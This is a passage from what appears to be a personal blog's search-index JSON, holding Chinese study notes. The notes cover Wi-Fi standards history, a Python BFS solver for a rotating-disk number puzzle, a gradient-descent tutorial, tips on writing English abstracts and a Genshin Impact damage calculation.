802.11ac通常被认为是Wi-Fi5，802.11ac是在802.11a标准上建立起来的，与802.11a一样，仅运行在5GHz频段，能保证更少的冲突。但沿用了802.11n中的MIMO技术，最终理论速度由802.11n的600Mbps跃升至1Gbps。再此基础上，802.11ac也将完全兼容802.11 a/n。 802.11ax 802.11ax通常被认为是Wi-Fi6，也是正在兴起的一代产品，802.11ax的设计并没有在当前802.11ac的160M带宽上进行增加，而更关注的是如何更有效的使用当前频段资源，从而提供更高的实际网络速率。802.11ax具有如下特点： 协议兼容性：能够兼容以往的802.11a/b/n/ac，等等标准，且该标准是即802.11n以后第二款能同时运行在2.4GHz和5GHz频段下的标准 更好的节能新 更高的传输速率以及覆盖范围 引入上行MU-MIMO 引入OFDMA 补充 关于为什么最后FHSS会失败：FHSS实际上是有一定优势的，其虽然占据了79MHz的带宽，但是其单个子带宽仅仅是1MHz，只不过是要在79MHz的连续带宽上变化。子带宽更小意味更低的采样率，FHSS的硬件成本会更低。但是DSSS模式的稳定性会优于FHSS，以及DSSS的覆盖面会更大，覆盖的面积会更广。所以最初的802.11协议中，最终是稳定性和覆盖性战胜了硬件成本。 The.Innovation.Journey.Of.WiFi.The.Road.To.Global.Success 总结 发展历程 可见Wi-Fi技术的发展更多的体现在物理层技术的更新换代，这告诉了我们层次结构设计的重要性，得益于IOS和TCP/IP的层级设计，802.11协议只需要专注于1-2层级的设计，并且后续优化只需要从物理层入手就能得到不错的效果。 展望Wi-Fi7 实际上Wi-Fi6E标准已经在802.11的考虑范围内了，该标准主要是将频带拓展到了6GHz，我们有理由相信，包含更大量更新的802.11be标准将把对6GHz的支持纳入考虑的范围内。 此外，就现阶段来讲，MIMO目前Wi-Fi发展的中点倾向，而随着物联网设备的发展，接入AP的设备将越来越多，引入更多天线组的同时，或许将支持更多STA的同时通信。 最后，Mesh组网在如今Wi-Fi6设备上的尝试较为成功，Wi-Fi7中如何实现多AP的协同工作以解决Wi-Fi覆盖范围的问题，可能也会被考虑。 思考问题的方向 此外，通过802.11的发展历程我们可以发现，一项技术的发展往往不是闭门造车，实际上，它在发展过程中引入了许多来自LTE通讯的技术，尽管LTE可以说是Wi-Fi的竞品。而802.11协议的发展也不是埋头朝着一个方向发展，很多时候出现了多条思路并行发展的情况，最后每条路上发展的解决方案，互相影响，最后再融合，从而使得产品越来越好，也是我们值得学习的思路。最后，802.11协议在向后兼容方面的考虑也值得我们去学习。","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"高级计算机网络","slug":"研究生/高级计算机网络","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"高级计算机网络","slug":"高级计算机网络","permalink":"http://enderxiao.github.io/tags/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"802.11","slug":"802-11","permalink":"http://enderxiao.github.io/tags/802-11/"},{"name":"WiFi","slug":"WiFi","permalink":"http://enderxiao.github.io/tags/WiFi/"}]},{"title":"人工智能原理作业","slug":"人工智能原理作业","date":"2021-10-14T08:15:12.000Z","updated":"2024-07-30T11:26:33.922Z","comments":true,"path":"2021/10/14/人工智能原理作业/","permalink":"http://enderxiao.github.io/2021/10/14/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%8E%9F%E7%90%86%E4%BD%9C%E4%B8%9A/","excerpt":"人工智能原理作业记录","text":"人工智能原理作业记录 背景 AI这门课程需要我们完成一项选择性作业，需要完成编码，演示，报告，因此写这篇文章做一些实验记录 题目 作业: (二选一) 2) 算法程序 四个同心园盘的扇区数字如图所示， 每个圆盘可以单独转动，如何设计搜索算法转动 圆盘使得8个扇区径向数字之和均为12. 分析 阴影部分数字和：48 直径部分数字和：24 转45°改变阴影部分 转90°改变直径部分 但不改变阴影部分 转180°改变扇区部分 但不改变阴影部分 也不改变直径部分 分析 题目要求使用搜索算法搜索出答案，那么我们将整个问题视为一个大的产生式，则需要做的工作就可初步分为如下几个方面： 如何表示综合数据库 如何表示规则库 如何表示控制系统 我们使用状态空间法将这些问题具体话，则可以产生如下问题： 如何表示状态空间 如何进行状态转化 使用怎样的控制策略对问题进行求解 状态空间 问题中提及的原状态是一个被划分为4个柱面+8个扇面的原，显然无法用代码完全还原原有模样。 但我们思考如何表示一个包含数字的小块。比如图中最外圈的数字为1的块，我们可以认为它位于第4扇区第4柱面。 以此为基础我们可以将整个磁盘表示为一个二维矩阵： (柱面)(扇区) 0 1 2 3 4 5 6 7 1 2 2 5 1 5 3 4 3 2 2 1 3 4 5 3 5 2 3 1 3 2 1 3 4 2 5 4 3 2 3 4 1 3 4 5 图的存储问题在此得到了解决，此外我们为了不重复搜索状态，需要对每种状态给定一个唯一的标识符号，且，由于问题的求解需要考量每个扇区的加权和。因此我们也需要将每个扇区的和存入状态。 状态转化 如何表示状态的转化，也就是要构造一个对状态封闭的规则集。 根据题面的描述，我们的每一步操作需要对二维数组的某一行进行循环左移或右移。 而由于实际的操作是在圆盘上进行的，因此，只需保证一个方向的移动即可。 因此我们可以定义操作：M(i,j)M(i,j)M(i,j),表示将第i行循环右移j个单位。 状态去重 为了避免不必要的重复搜索，我们需要对状态进行标记的操作。对于每个状态，判断其是否出现过，最简单的方法就是维护一个visited表，其中存放了所有已经拓展过的状态，最直接的方法就是将状态原原本本你的存入，也就是将以二维表表示的状态直接存入visited表，这样visited将是一个三维数组。 由于最坏的情况下我们需要拓展所有的状态，若我们的状态包括m行，n列，那么这样做的空间复杂度将是O(mnn)O(m^{n}n)O(mnn)，并且判断状态是否重复需要O(m(n)∗n)O(m^{(n)}*n)O(m(n)∗n)的复杂度 这样做显然效率非常低，于是我们考虑能否将状态表示的复杂度降低。 由于状态中每行的顺序是固定的，因此我们只需要记录每行相对初状态的相对位置即可表示每行上的状态变化。因此我们可以使用一维数组来记录每一行的相对位置，那么visted数组就能降低为2维数组。 那么用这种方式记录的状态，空间复杂度为O(mn)O(m^n)O(mn)，时间复杂度为O(mn)O(m^{n})O(mn) 控制策略 首先我们采用没有启发信息的，即f(n)=g(n)+h(n)f(n)=g(n)+h(n)f(n)=g(n)+h(n)，其中h(n)=0,g(n)=d(n)h(n) = 0,g(n) = d(n)h(n)=0,g(n)=d(n)，其中d(n)d(n)d(n)表示搜索深度，即BFS算法。 具体实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130import queueimport numpy as npimport copyd1 = [2, 2, 5, 1, 5, 3, 4, 3]d2 = [2, 1, 3, 4, 5, 3, 5, 2]d3 = [1, 3, 2, 1, 3, 4, 2, 5]d4 = [3, 2, 3, 4, 1, 3, 4, 5]d = []class status(object): def __init__(self, matrix, statusCode, columSum, columNum, rowNum): self.matrix = matrix self.statusCode = statusCode self.columSum = columSum self.columNum = columNum self.rowNum = rowNum def __str__(self): return self.matrix __repr__ = __str__class sector(object): def __init__(self, data, index) : self.data = data self.index = index def set_data(self, d): self.data = d def __add__(self, other): v = self.data + other.data return sector(v, self.index) def __str__(self) -&gt; str: return f&quot;(%d)[%d]&quot; %(self.data, self.index) __repr__ = __str__def judge(status): for i in status.columSum: if i.data != 12: return False return Truedef reverse(start, end, A): end = end - 1 while start &lt; end: A[start], A[end] = A[end], A[start] start += 1 end -= 1def move(status, row, step): length = len(status.matrix[row]) reverse(0, length, status.matrix[row]) # 0 1 2 3 4 5 6 7 -&gt; 7 6 5 4 3 2 1 0 reverse(0, step, status.matrix[row]) # 7 6 5 4 3 2 1 0 reverse(step, length, status.matrix[row]) # 7 0 1 2 3 4 5 6 columSum = [] for i in range(8): sumNow = np.sum(status.matrix[:,i]) # print(sumNow) columSum.append(sumNow) status.columSum = columSum status.statusCode[row] = (status.statusCode[row] + step)%8 # print(status.statusCode) returndef visited(status, visit): if status.statusCode in visit: return True else: return Falsedef dfs(status_origin): searchNum = 0 # 记录搜索次数 visit = [] q = queue.Queue() q.put(status_origin) status_now = copy.deepcopy(status_origin) temp = copy.deepcopy(status_origin) visit.append(temp.statusCode) flag = False while not q.empty(): searchNum += 1 status_now = q.get() # print(&quot;=======取出状态=======&quot;) # print(status_now.matrix) # print(status_now.statusCode) # print(&quot;======================&quot;) for i in range(3): temp = copy.deepcopy(status_now) move(temp, (i+1), 1) # 移动第i个转盘，移动j次 if not visited(temp, visit) : visit.append(temp.statusCode) if judge(temp): flag = True print(temp.matrix) print(temp.statusCode) break q.put(temp) # print(&quot;=======加入队列=======&quot;) # print(temp.matrix) # print(&quot;======================&quot;) if flag: print(searchNum) break # else: # print(&quot;重复状态&quot;) # print(temp.statusCode) # print(&quot;======================&quot;) # input()if __name__ == &quot;__main__&quot;: d = [d1,d2,d3,d4] for i in range(len(d)): for j in range(len(d[i])): d[i][j] = sector(d[i][j], j) matrixO = np.array(d).reshape(4, 8) columSum = [] for i in range(8): sumNow = np.sum(matrixO[:,i]) # print(sumNow) columSum.append(sumNow) statusCodeO = [0, 0, 0, 0] statusO = status(matrixO, statusCodeO, columSum, len(d1), len(d)) dfs(statusO) 运行结果： 123456[[(2)[0] (2)[1] (5)[2] (1)[3] (5)[4] (3)[5] (4)[6] (3)[7]] [(3)[5] (5)[6] (2)[7] (2)[0] (1)[1] (3)[2] (4)[3] (5)[4]] [(3)[4] (4)[5] (2)[6] (5)[7] (1)[0] (3)[1] (2)[2] (1)[3]] [(4)[3] (1)[4] (3)[5] (4)[6] (5)[7] (3)[0] (2)[1] (3)[2]]] # 最终状态[0, 3, 4, 5] # 最终状态表示286 # 拓展节点个数","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"人工智能原理","slug":"研究生/人工智能原理","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"8圆盘问题","slug":"8圆盘问题","permalink":"http://enderxiao.github.io/tags/8%E5%9C%86%E7%9B%98%E9%97%AE%E9%A2%98/"},{"name":"A算法","slug":"A算法","permalink":"http://enderxiao.github.io/tags/A%E7%AE%97%E6%B3%95/"},{"name":"BFS","slug":"BFS","permalink":"http://enderxiao.github.io/tags/BFS/"}]},{"title":"智能信息检索报告纲要","slug":"智能信息检索报告纲要","date":"2021-10-13T05:58:08.000Z","updated":"2024-07-30T11:26:33.935Z","comments":true,"path":"2021/10/13/智能信息检索报告纲要/","permalink":"http://enderxiao.github.io/2021/10/13/%E6%99%BA%E8%83%BD%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E6%8A%A5%E5%91%8A%E7%BA%B2%E8%A6%81/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"梯度下降法","slug":"梯度下降法","date":"2021-10-08T04:23:24.000Z","updated":"2024-07-30T11:26:33.936Z","comments":true,"path":"2021/10/08/梯度下降法/","permalink":"http://enderxiao.github.io/2021/10/08/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%B3%95/","excerpt":"机器学习中常常需要通过求某个模型的极致来确定参数，本文讨论一下比较常用的梯度下降法","text":"机器学习中常常需要通过求某个模型的极致来确定参数，本文讨论一下比较常用的梯度下降法 背景 学习线性回归算法，求解模型参数时，涉及到利用最值确定模型参数的方法。而梯度下降法求极值的方法被较多的提及，本文将梳理一下梯度下降法的思想。 思路 梯度gradient 所谓梯度，即为一个向量（矢量），用以表示某一函数在该点处的方向导数沿着该方向取得最大值。即函数在该点处沿着该方向变化最快，变化率最大（为梯度的模） 通俗来说就是爬山时，当你身处山上的某一点时，从该点出发，上山或下山的最快方向（并不考虑体力，耐力）。 梯度下降 梯度下降法，用梯度的思想来求解函数的最小值。 例如在山顶放了一个小球，松手后它会随着山坡最陡峭的地方滚落到山谷。 动机 就本科阶段学习的高等数学知识而言，我们也经常会接触到求函数极值的问题，我们通常会使用另倒数等于0的方法来讨论函数的极值点。例如二维凸函数（此处凸函数是指高数中的凹函数和凸函数的总称） f(x)=x2f(x) = x^2f(x)=x2 通过另倒数等于0，我们可以得到如下结论: f′(x)=2x=0f&#x27;(x) = 2x = 0f′(x)=2x=0 x=0x = 0x=0 即在0出取得最小值。 而对于如下这个二元函数： f(w0,w1)=16[ln(1+ew0+2w1)+ln(1+e−w0−7w1)f(w_0,w_1) = \\frac{1}{6}[ln(1+e^{w_0+2w_1}) + ln(1+e^{-w_0-7w_1}) f(w0​,w1​)=61​[ln(1+ew0​+2w1​)+ln(1+e−w0​−7w1​) +ln(1+e−w0−4w1)+ln(1+ew0+w1)+ ln(1+e^{-w_0-4w_1})+ ln(1+e^{w_0+w_1}) +ln(1+e−w0​−4w1​)+ln(1+ew0​+w1​) +ln(1+e−w0−5w1)+ln(1+ew0+4.5w1)]+ ln(1+e^{-w_0-5w_1}) + ln(1+e^{w_0+4.5w_1})] +ln(1+e−w0​−5w1​)+ln(1+ew0​+4.5w1​)] 用导数法来求他的最小值会变得异常困难。而事实上，该函数是逻辑回归的经验误差函数，我们需要通过求这个函数的最小值来确定两个参数。 通过绘制该函数的图像，我们可以得到一个类似山谷的图像。那么我们思考能否使用梯度下降法。 简单例子 学习的过程通常是有简入繁的过程，接下来我们使用之前提到的相对简单的列子f(x)=x2f(x) = x^2f(x)=x2来引出梯度下降法。 梯度 根据梯度下降法的思路，在进行梯度下降法时，我们首先需要一个“小球”。例如，我们一开始将这个二维的”小球“放置在x=10的位置上，则小球的初始坐标为(10,f(10)=100)(10,f(10)=100)(10,f(10)=100)。 ”小球“由于受力不平衡，那么他会向山坡下移动，一些物理学知识我们可以预测，小球将会向坡度最陡峭的那个方向移动，这就与梯度的概念不谋而合。由于此处我们需要讨论向量，为了方便，我们规定标量+括号，如：(x)(x)(x)表示一个向量 于是我们求该点处的梯度： Δf(x0)=f′(x0)(i)=(f′(x0))=(2x∣x0=10)=(20)\\Delta f(x_0) = f&#x27;(x_0)(i) = (f&#x27;(x_0)) = (2x|_{x_0 = 10}) = (20)Δf(x0​)=f′(x0​)(i)=(f′(x0​))=(2x∣x0​=10​)=(20) 可见在二位坐标系下，梯度向量是一个以为向量，反应到坐标上的变化，也就是x的变化率。 那么我们将“小球”所在的位置加上梯度方向，则就可以得到小球移动后的向量(x1)(x_1)(x1​)： (x1)=(x0)−η(Δf(x0))(x_1) = (x_0) - \\eta(\\Delta f(x_0))(x1​)=(x0​)−η(Δf(x0​)) 其中η\\etaη成为步长，用于控制每次滚动的距离标量。此处我们使用η=0.2\\eta = 0.2η=0.2，那么： (x1)=(x0)−0.2×(Δf(x0))=(6)(x_1) = (x_0) - 0.2\\times (\\Delta f(x_0)) = (6)(x1​)=(x0​)−0.2×(Δf(x0​))=(6) 迭代 至此我们完成了”小球”的一步滚动，但是要完整实现我们的思路，还需要使小球连续运动直到它到达谷底。一个很常规的思路就是得到每一步的终点后，以该点为基础继续进行移动，也就是迭代。 x1x_1x1​的梯度为： Δf(x1)=f′(x1)(i)=(f′(x1))=(2x∣x1=6)=(12)\\Delta f(x_1) = f&#x27;(x_1)(i) = (f&#x27;(x_1)) = (2x|_{x_1=6}) = (12)Δf(x1​)=f′(x1​)(i)=(f′(x1​))=(2x∣x1​=6​)=(12) 则下一步“小球”将移动到： (x2)=(x1)−ηΔf(x1)=(6)−0.2×(12)=(3.6)(x_2) = (x_1) - \\eta \\Delta f(x_1) = (6) - 0.2 \\times (12) = (3.6)(x2​)=(x1​)−ηΔf(x1​)=(6)−0.2×(12)=(3.6) 在迭代到第10次时，我们得到x10≈0x_{10} \\approx 0x10​≈0 总结 此时我们把每次求得的梯度的模长∣∣Δf∣∣||\\Delta f||∣∣Δf∣∣，归纳起来，可以得到下面的表格： x0x_0x0​ x1x_1x1​ x2x_2x2​ x3x_3x3​ x4x_4x4​ x5x_5x5​ x6x_6x6​ x7x_7x7​ x8x_8x8​ x9x_9x9​ x10x_{10}x10​ || Δf\\Delta fΔf || 20 12 7.2 4.32 2.59 1.56 0.93 0.56 0.34 0.2 0.12 观察可以发现，随着迭代次数的增加有： ∣∣Δf∣∣=0→Δf=0→f′(x)=0||\\Delta f|| = 0 \\to \\Delta f = 0 \\to f&#x27;(x) = 0∣∣Δf∣∣=0→Δf=0→f′(x)=0 最终我们得到与另倒数等于0的这种方法相似的效果。但同样可以知道使用此法测算出的结果是一个接近于极值点的情况，并不是真正的极值点。这也体现了我们在将理论进行实际引应用中，为了解决种种问题而在最终结果上做出妥协的思考方式。 关于步长 上文提到，步长可以由我们自由设置，但是如果步长设置不够合理，将会导致无法找到最大或最小值的情况。 例如在测算f(x)=x2f(x) = x^2f(x)=x2时，令η=1.1\\eta = 1.1η=1.1，那么随着迭代的增加f(x)f(x)f(x)的值会越来越大。换句话说，就是小球某一步直接滚过了最小值，导致小球在无摩擦力的情况下每次获得了更大的重力势能，导致其越滚越高。 通常步长不当可根据f(x)f(x)f(x)的变化趋势，分为以下三种情况： f(x)f(x)f(x)越来越大，则η\\etaη过大 f(x)f(x)f(x)一开始急剧下降，到达某一值时几乎不变，则η\\etaη较大 f(x)f(x)f(x)几乎是线性变化，即变化过于缓慢，则η\\etaη较小，可适当提高 总结 至此，梯度下降法的基本思想和操作方式讲解已经结束了，为我们提供了一种新的求极值的思路，并且让我们回顾了科学技术在实际应用中的适应思路。之后需要多多练习。对于更高纬的情况，例如: f(x)=x12+2x22f(x) = x_1^2 + 2x_2^2f(x)=x12​+2x22​ 可以使用梯度下降法自行求解。","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/categories/Machine-Learning/"},{"name":"机器学习入门","slug":"Machine-Learning/机器学习入门","permalink":"http://enderxiao.github.io/categories/Machine-Learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"数学工具","slug":"数学工具","permalink":"http://enderxiao.github.io/categories/%E6%95%B0%E5%AD%A6%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/tags/Machine-Learning/"},{"name":"数学","slug":"数学","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E5%AD%A6/"},{"name":"梯度下降","slug":"梯度下降","permalink":"http://enderxiao.github.io/tags/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D/"},{"name":"函数极值","slug":"函数极值","permalink":"http://enderxiao.github.io/tags/%E5%87%BD%E6%95%B0%E6%9E%81%E5%80%BC/"}]},{"title":"Abstract","slug":"Abstract","date":"2021-09-29T14:01:14.000Z","updated":"2024-07-30T11:26:33.904Z","comments":true,"path":"2021/09/29/Abstract/","permalink":"http://enderxiao.github.io/2021/09/29/Abstract/","excerpt":"The way to write an Abstract in English","text":"The way to write an Abstract in English What need to be incuded in Abstract summarize all parts of your paper words tips accurately concisely only including most important content what we need is keeping the readers seduced into reading your paper classification two types of abstracts Descriptive abstract 100~200 words indicates type of information found in the paper explains the purpose,objective,methods of the paper the results and conclusion are excluded Informative abstracts most common for conference and journal papers concidering as the “Surrogate” of the reasearch paper summarize every aspect of the paper including the result Guide Lines Structure of your abstract Purpose and Motivation get the reader’s attention tell the purpose and motivation of your study Motivation including: Why this Particular study Why is it important Problem What’s your research trying to understand or solve What’s your central claim or argument your can start with ”The purpose of this study is to …” Methods Only discuss the most significant methods you used Dont reference other studies here Results State only the most significant results Line this result to your problem and your conclusion Conclusion Relate back to your problem and purpose Answer the question you initially sate out at the begining of your abstract you can try to answer the following questions: What do the results mean in teh context of the problem What other unanswered questions are there Writing tips Write the abstract last Keep your content in correct order Write the abstract from scratch Don’t copy and paste from the body of your paper Only use highly relevant terms as your keyword","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"英语","slug":"研究生/英语","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%8B%B1%E8%AF%AD/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"英语","slug":"英语","permalink":"http://enderxiao.github.io/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"英语论文写作","slug":"英语论文写作","permalink":"http://enderxiao.github.io/tags/%E8%8B%B1%E8%AF%AD%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/"},{"name":"abstract","slug":"abstract","permalink":"http://enderxiao.github.io/tags/abstract/"}]},{"title":"伤害乘区论","slug":"伤害乘区论","date":"2021-09-21T03:29:08.000Z","updated":"2024-07-30T11:26:33.922Z","comments":true,"path":"2021/09/21/伤害乘区论/","permalink":"http://enderxiao.github.io/2021/09/21/%E4%BC%A4%E5%AE%B3%E4%B9%98%E5%8C%BA%E8%AE%BA/","excerpt":"原神伤害乘区计算","text":"原神伤害乘区计算 背景 本次计算主要想计算自己的雷神配队大招期望伤害，因此将会以此为例子来计算，配对基本信息： 雷神（主C） 九条（攻击力加成区间，雷元素爆伤60%） 班尼特（回复，攻击加成） 万叶（减抗区间） 个角色信息 角色 攻击 暴击率 暴击伤害 元素伤害 充能 生命 防御 雷神 945+1514 32.6% 130.1% 76.5% 291.5% 12907+6279 789+302 九条 717+621 16.7% 64.0% 46.6% 170.0% 8481+2713 556+109 班尼特 627+742 5% 50% 0 157.1% 11539+2600 718+225 万叶 838+1030 57.3% 81.9% 15.0% 121.4% 13348+9123 807+166 伤害乘区分类 基础乘区 增伤乘区 防御乘区 独立乘区（宵宫e，行秋4命） 基础伤害乘区 技能倍率乘区 角色属性乘区 基础伤害乘区=攻击力×技能倍率+附加伤害(对应属性×加成百分比)基础伤害乘区 = 攻击力\\times 技能倍率 + 附加伤害(对应属性\\times 加成百分比)基础伤害乘区=攻击力×技能倍率+附加伤害(对应属性×加成百分比) 伤害增益乘区 暴伤乘区 $暴击爆伤期望 = 暴击率 \\times (1+爆伤) + (1-暴击率) \\times 1 $ 也就是: 暴击爆伤期望=1+暴击率×爆伤暴击爆伤期望 = 1+ 暴击率 \\times 爆伤暴击爆伤期望=1+暴击率×爆伤 增伤乘区 增伤乘区=1+各种伤害加成之和增伤乘区 = 1 + 各种伤害加成之和增伤乘区=1+各种伤害加成之和 伤害加成，如： 对应元素伤害加成 装备伤害加成 条件伤害提高 增幅反应乘区 增幅反应倍率=反应基础倍率×(1+元素精通加成+装备加成)增幅反应倍率 = 反应基础倍率 \\times (1+元素精通加成 + 装备加成)增幅反应倍率=反应基础倍率×(1+元素精通加成+装备加成) 反应基础倍率： 冰火反应 1.5倍 火冰反应 2.0倍 火水反应 1.5倍 水火反应 2.0倍 元素精通加成 元素精通加成=2.78×元素精通元素精通+1400元素精通加成 = \\frac{2.78\\times 元素精通}{元素精通 + 1400}元素精通加成=元素精通+14002.78×元素精通​ 装备加成 魔女4，如雷4 莫娜一命 敌人承伤乘区 抗性乘区 抗性承伤率 此为分段函数： 抗性承伤率=1(1+4×抗性) 抗性&gt;75抗性承伤率 = \\frac{1}{(1+4\\times 抗性)}\\space 抗性&gt;75%抗性承伤率=(1+4×抗性)1​ 抗性&gt;75 抗性承伤率=1−抗性 0&lt;抗性&lt;75抗性承伤率 = 1-抗性\\space 0&lt;抗性&lt;75%抗性承伤率=1−抗性 0&lt;抗性&lt;75 抗性承伤率=1−抗性2 抗性&lt;0抗性承伤率 =1-\\frac{抗性}{2}\\space 抗性&lt; 0抗性承伤率=1−2抗性​ 抗性&lt;0 防御乘区 防御承伤率=500+5×攻击者等级500+5×攻击者等级+受击者防御防御承伤率 = \\frac{500+5\\times 攻击者等级}{500+5\\times 攻击者等级 + 受击者防御}防御承伤率=500+5×攻击者等级+受击者防御500+5×攻击者等级​ 受击者防御=500+5×受击者等级受击者防御 = 500+5\\times 受击者等级受击者防御=500+5×受击者等级 带入得： 防御承伤率=100+攻击者等级100+攻击者等级+100+敌人等级防御承伤率 = \\frac{100+攻击者等级}{100+攻击者等级+100+敌人等级}防御承伤率=100+攻击者等级+100+敌人等级100+攻击者等级​ 考虑减防御后： 防御承伤率=100+攻击者等级(100+攻击者等级)+(100+敌人等级)×(1−减防比)×(1−无视防御)防御承伤率 = \\frac{100+攻击者等级}{(100+攻击者等级)+(100+敌人等级) \\times (1-减防比) \\times (1-无视防御)}防御承伤率=(100+攻击者等级)+(100+敌人等级)×(1−减防比)×(1−无视防御)100+攻击者等级​ 独立乘区 行秋4命 宵宫E 雷神伤害计算实列 基础伤害区间 雷神攻击力：2460 无想一刀伤害倍率：641% 愿力加成：6.22%×606.22\\% \\times 606.22%×60 该区间总系数 基础伤害=2460×641%×+2460×6.22%×60=24949.32基础伤害 = 2460 \\times 641\\%\\times + 2460 \\times 6.22\\% \\times 60 = 24949.32基础伤害=2460×641%×+2460×6.22%×60=24949.32 班尼特加攻 班尼特大招将提供： 1368×84%=1149.121368 \\times 84\\% = 1149.121368×84%=1149.12 点攻击力加成 九条加攻 九条乌羽将提供： 1338×64%=856.321338 \\times 64\\% = 856.321338×64%=856.32 点攻击力加成 考虑辅助效果的总系数 基础伤害=(2460+1149.12+856.32)×641%×+(2460+1149.12+856.32)×6.22%×60=45288.49247999999基础伤害 = (2460+1149.12 + 856.32) \\times 641\\%\\times + (2460+1149.12 + 856.32) \\times 6.22\\% \\times 60 = 45288.49247999999基础伤害=(2460+1149.12+856.32)×641%×+(2460+1149.12+856.32)×6.22%×60=45288.49247999999 伤害增益乘区 增伤乘区 雷神e技能：元素爆发增伤=0.26%×90=23.4%元素爆发增伤 = 0.26\\% \\times 90 = 23.4\\%元素爆发增伤=0.26%×90=23.4% 雷元素伤害：76.5%（雷神天赋） 绝缘之旗：291.5%×25%=72.875%291.5\\% \\times 25\\% = 72.875\\%291.5%×25%=72.875% 万叶天赋：801×0.04%=32.04%801 \\times 0.04\\% = 32.04\\%801×0.04%=32.04% 增伤倍率=1+(23.4%+76.5%+72.875%+32.04%)=304.815%增伤倍率 = 1 + (23.4\\% + 76.5\\% + 72.875\\% + 32.04\\%) = 304.815\\%增伤倍率=1+(23.4%+76.5%+72.875%+32.04%)=304.815% 暴击伤害乘区 暴击期望=1+32.6%×130.1%=142.4126%暴击期望 = 1 + 32.6\\% \\times 130.1\\% = 142.4126\\%暴击期望=1+32.6%×130.1%=142.4126% 若下次一定暴击 爆伤=1+130.1%=230.1%爆伤 = 1+130.1\\% = 230.1\\%爆伤=1+130.1%=230.1% 考虑辅助效果的总系数 九条6命将提供额外60%的爆伤，则 爆伤=230.1%+60%=290.1%爆伤 = 230.1\\%+60\\% = 290.1\\%爆伤=230.1%+60%=290.1% 增幅反应乘区 雷神不打增幅反应，我们认为此乘区为1 该区间总系数 伤害增益乘区=304.815%×230.1%×1=701.379%伤害增益乘区 = 304.815\\% \\times 230.1\\% \\times 1 = 701.379\\%伤害增益乘区=304.815%×230.1%×1=701.379% 考虑辅助时该区间总系数 伤害增益乘区=304.815%×290.1%×1=884.268315%伤害增益乘区 = 304.815\\% \\times 290.1\\% \\times 1 = 884.268315\\%伤害增益乘区=304.815%×290.1%×1=884.268315% 敌人承伤区 以岩龙蜥为例： 雷抗：10%（非雷属性），雷属性时：30% 防御：30% 万叶四风套： 减抗：40% 抗性承伤区间 10%−40%=−30%10\\% - 40\\% = -30\\%10%−40%=−30% 1−(−30%/2)=115%1 - (-30\\%/2) = 115\\%1−(−30%/2)=115% 防御乘区 防御承伤率=100+90(100+90)+(100+93)×(1−0)×(1−0)=49.608%防御承伤率 = \\frac{100+90}{(100+90)+(100+93) \\times (1-0) \\times (1-0)} = 49.608\\%防御承伤率=(100+90)+(100+93)×(1−0)×(1−0)100+90​=49.608% 该乘区总系数 承伤乘区=115%×49.608%=57.0492%承伤乘区 = 115\\% \\times 49.608\\% = 57.0492\\%承伤乘区=115%×49.608%=57.0492% 伤害期望 则总伤害期望为： 总伤害=24949.32×701.379%×57.0492%=99829.99067122841总伤害 = 24949.32 \\times 701.379\\% \\times 57.0492\\% = 99829.99067122841总伤害=24949.32×701.379%×57.0492%=99829.99067122841 考虑辅助效果 总伤害=45288.49247999999×884.268315%×57.0492%=228465.95204518083总伤害 = 45288.49247999999 \\times 884.268315\\% \\times 57.0492\\% = 228465.95204518083总伤害=45288.49247999999×884.268315%×57.0492%=228465.95204518083","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"Genshin","slug":"Life/Genshin","permalink":"http://enderxiao.github.io/categories/Life/Genshin/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"Genshin","slug":"Genshin","permalink":"http://enderxiao.github.io/tags/Genshin/"},{"name":"原神","slug":"原神","permalink":"http://enderxiao.github.io/tags/%E5%8E%9F%E7%A5%9E/"},{"name":"伤害乘区论","slug":"伤害乘区论","permalink":"http://enderxiao.github.io/tags/%E4%BC%A4%E5%AE%B3%E4%B9%98%E5%8C%BA%E8%AE%BA/"},{"name":"雷神","slug":"雷神","permalink":"http://enderxiao.github.io/tags/%E9%9B%B